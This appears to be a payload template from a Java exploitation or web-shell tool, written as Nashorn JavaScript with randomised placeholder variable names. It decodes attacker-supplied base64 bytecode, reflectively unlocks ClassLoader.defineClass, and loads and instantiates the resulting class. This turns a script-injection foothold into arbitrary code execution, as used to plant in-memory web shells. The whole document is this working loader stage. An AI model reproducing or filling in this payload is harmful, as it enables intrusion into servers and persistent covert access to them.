var {{VAR:base64Str}} = "{{base64Str}}";
var {{VAR:className}} = "{{className}}";
var {{VAR:clsString}} = java.lang.Class.forName("java.lang.String");
var {{VAR:bytecode}};
try {
    var {{VAR:decoder}} = java.lang.Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
    {{VAR:bytecode}} = {{VAR:decoder}}.getClass().getMethod("decode", {{VAR:clsString}}).invoke({{VAR:decoder}}, {{VAR:base64Str}});
} catch ({{VAR:ee}}) {
    var {{VAR:decoder}} = java.lang.Class.forName("sun.misc.BASE64Decoder").newInstance();
    {{VAR:bytecode}} = {{VAR:decoder}}.getClass().getMethod("decodeBuffer", {{VAR:clsString}}).invoke({{VAR:decoder}}, {{VAR:base64Str}});
}
var {{VAR:clsByteArray}} = (new java.lang.String("a").getBytes().getClass());
var {{VAR:clsInt}} = java.lang.Integer.TYPE;
var {{VAR:defineClass}} = java.lang.Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", [{{VAR:clsString}}, {{VAR:clsByteArray}}, {{VAR:clsInt}}, {{VAR:clsInt}}]);
{{VAR:defineClass}}.setAccessible(true);
var {{VAR:clazz}} = {{VAR:defineClass}}.invoke(new java.net.URLClassLoader(java.lang.reflect.Array.newInstance(java.lang.Class.forName("java.net.URL"), 0),java.lang.Thread.currentThread().getContextClassLoader()), {{VAR:className}}, {{VAR:bytecode}}, new java.lang.Integer(0), new java.lang.Integer({{VAR:bytecode}}.length));
{{VAR:clazz}}.newInstance();
